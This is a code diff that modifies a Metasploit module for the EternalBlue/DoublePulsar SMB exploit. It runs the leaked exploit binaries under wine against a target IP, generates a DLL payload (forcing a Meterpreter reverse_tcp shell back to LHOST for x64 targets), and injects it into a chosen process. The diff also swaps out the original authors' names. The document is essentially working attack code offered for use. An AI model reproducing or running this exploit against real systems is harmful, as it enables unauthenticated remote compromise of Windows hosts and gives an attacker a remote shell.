@@ -11,13 +11,13 @@ class MetasploitModule < Msf::Exploit::Remote
       'Description' => %q{
           This module exploits a vulnerability on SMBv1/SMBv2 protocols through Eternalblue. 
 	  After that, doublepulsar is used to inject remotely a malicious dll (it's will generate based on your 	  payload selection).
-	  You can use this module to compromise a host remotely (among the targets available) without needing 		  nor authentication neither target's user interaction.
+	  You can use this module to compromise a host remotely (among the targets available) without needing   nor authentication neither target's user interaction.
+          THIS MODULE WAS MODIFY FROM https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
 	  ** THIS IS AN INTEGRATION OF THE ORIGINAL EXPLOIT, IT'S NOT THE FULL PORTATION **
       },
       'Author'      =>
         [
-          'Pablo Gonzalez (@pablogonzalezpe)',
-          'Sheila A. Berta (@UnaPibaGeek)'
+          'SUMEDT JITPUKDEBODIN'
         ],
 		'Payload'        =>
         {
@@ -61,14 +61,7 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def exploit
-
-  #Custom XML Eternalblue
-  print_status('Generating Eternalblue XML data')
-  cp = `cp #{datastore['ETERNALBLUEPATH']}/Eternalblue-2.2.0.Skeleton.xml #{datastore['ETERNALBLUEPATH']}/Eternalblue-2.2.0.xml`
-  sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['ETERNALBLUEPATH']}/Eternalblue-2.2.0.xml`
-  sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['ETERNALBLUEPATH']}/Eternalblue-2.2.0.xml`
-  sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['ETERNALBLUEPATH']}/Eternalblue-2.2.0.xml`
-
+ 
   #WIN72K8R2 (4-8) and XP (0-3)
   if target.name =~ /7|2008|Vista/
 	objective = "WIN72K8R2"
@@ -76,23 +69,16 @@ class MetasploitModule < Msf::Exploit::Remote
 	objective = "XP"
   end
 
-  sed = `sed -i 's/%TARGET%/#{objective}/' #{datastore['ETERNALBLUEPATH']}/Eternalblue-2.2.0.xml`
-
-  #Custom XML Doublepulsar
-  print_status('Generating Doublepulsar XML data')
-  cp = `cp #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.Skeleton.xml #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
-  sed = `sed -i 's/%RHOST%/#{datastore['RHOST']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
-  sed = `sed -i 's/%RPORT%/#{datastore['RPORT']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
-  sed = `sed -i 's/%TIMEOUT%/#{datastore['TIMEOUT']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
-  sed = `sed -i 's/%TARGETARCHITECTURE%/#{datastore['TARGETARCHITECTURE']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
+  #Generate DLL
   dllpayload = datastore['WINEPATH'] + datastore['DLLName']
   dllpayload2 = dllpayload.gsub('/','\/')
-  sed = `sed -i 's/%DLLPAY%/#{dllpayload2}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
-  sed = `sed -i 's/%PROCESSINJECT%/#{datastore['PROCESSINJECT']}/' #{datastore['DOUBLEPULSARPATH']}/Doublepulsar-1.3.1.xml`
-
-  #Generate DLL
   print_status("Generating payload DLL for Doublepulsar")
-  pay = framework.modules.create(datastore['payload'])
+  	if (datastore['TARGETARCHITECTURE'] =~ /x86/)
+		pay = framework.modules.create(datastore['payload'])
+  	else
+		datastore['payload'] = "windows/x64/meterpreter/reverse_tcp"
+		pay = framework.modules.create('windows/x64/meterpreter/reverse_tcp')
+  	end
   pay.datastore['LHOST'] = datastore['LHOST']
   dll = pay.generate_simple({'Format'=>'dll'})
   File.open(datastore['WINEPATH']+datastore['DLLName'],'w') do |f|
@@ -102,7 +88,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
   #Send Exploit + Payload Injection
   print_status('Launching Eternalblue...')
-  output = `cd #{datastore['ETERNALBLUEPATH']}; wine Eternalblue-2.2.0.exe`
+  output = `cd #{datastore['ETERNALBLUEPATH']}; wine Eternalblue-2.2.0.exe --TargetIp #{datastore['RHOST']}`
   if output =~ /=-=-WIN-=-=/
   	print_good("Pwned! Eternalblue success!")
   elsif output =~ /Backdoor returned code: 10 - Success!/
@@ -111,7 +97,7 @@ class MetasploitModule < Msf::Exploit::Remote
 	print_error("Are you sure it's vulnerable?")
   end
   print_status('Launching Doublepulsar...')
-  output2 = `cd #{datastore['DOUBLEPULSARPATH']}; wine Doublepulsar-1.3.1.exe`
+  output2 = `cd #{datastore['DOUBLEPULSARPATH']}; wine Doublepulsar-1.3.1.exe --TargetIp #{datastore['RHOST']} --Function RunDLL --DllPayload #{dllpayload} --ProcessName #{datastore['PROCESSINJECT']}`
   if output2 =~ /Backdoor returned code: 10 - Success!/
 	print_good("Remote code executed... 3... 2... 1...")
   else
@@ -123,8 +109,3 @@ class MetasploitModule < Msf::Exploit::Remote
  end
 
 end
-
-
-
-
-
